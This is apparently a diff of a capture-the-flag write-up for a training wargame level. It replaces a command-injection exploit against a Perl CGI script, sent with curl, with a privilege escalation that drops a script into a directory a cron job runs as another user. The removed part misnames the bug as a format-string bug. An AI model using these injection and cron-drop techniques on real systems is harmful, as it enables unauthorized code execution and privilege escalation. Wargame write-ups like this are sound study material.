@@ -1,44 +1,41 @@
-# cat README i choose the second part
+As you log in you can see that `you have new mail`
+Mails are stored into /var/mail/$USER
+
 ```
-...
-You can try to understand this little regex and there is a chance to have this flag..
-/!\ If you try to run it make sure you understand all this code ..:)/!\
-Or just exploit this single small script on this folder.
-This script run on port : 4747.
+level05@SnowCrash:~$ cat /var/mail/$USER
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
 ```
 
-# cat level05.pl
+you can see that the mail contain a cron task
+We can assume that this cron task is in use, but can't check it's veracity by doing `crontab -l -u flag05` because we haven't the right to see this user crontab
+
+
+by looking at the cron task we can see that every 2minutes the script /usr/sbin/openarenaserver is executed by flag05
+
+let's see what's inside /usr/sbin/openarenaserver
+
 ```
-level05@BornToSec:~$ cat level05.pl
-#!/usr/bin/perl
+level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
+#!/bin/sh
 
-use CGI qw{param};
-
-print "Content-type: text/html\n\n";
-
-sub ft_cmd {
-  $xd = $_[0];
-  print("<html><head><title>Echo results</title></head><body><pre>");
-  print `echo $xd 2>&1`;
-  print("</pre></body></html>");
-}
-ft_cmd(param("ft_cmd"));
-```
-
-# same format string bug like level03
-```
-print `echo $xd 2>&1`;
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
 ```
 
-# just need to encode &(%26) and curl the page
+It execute every scripts into /opt/openarenaserver and delete it.
+
+Let's build an exploit
+
+`echo 'getflag > /tmp/flag' > /opt/openarenaserver/exploit && sleep 180 && cat /tmp/flag && echo -ne '\007'`
+
+this will put a file into the /opt/openarenaserver wait 3min to be sure, print it and do a bell song after to notify you
+
+and we got the flag
+
 ```
-curl 'http://172.16.113.132:4747/?ft_cmd=toto%26getflag'
+level05@SnowCrash:~$ echo 'getflag > /tmp/flag' > /opt/openarenaserver/exploit && sleep 180 && cat /tmp/flag && echo -ne '\007'
+Check flag.Here is your token : viuaaale9huek52boumoomioc
 ```
 
-# result
-```
-level05@BornToSec:~$ curl 'http://172.16.113.132:4747/?ft_cmd=toto%26getflag'
-<html><head><title>Echo results</title></head><body><pre>Check flag.Here is your token : viuaaale9huek52boumoomioc
-toto
-</pre></body></html>level05@BornToSec:~$
-```
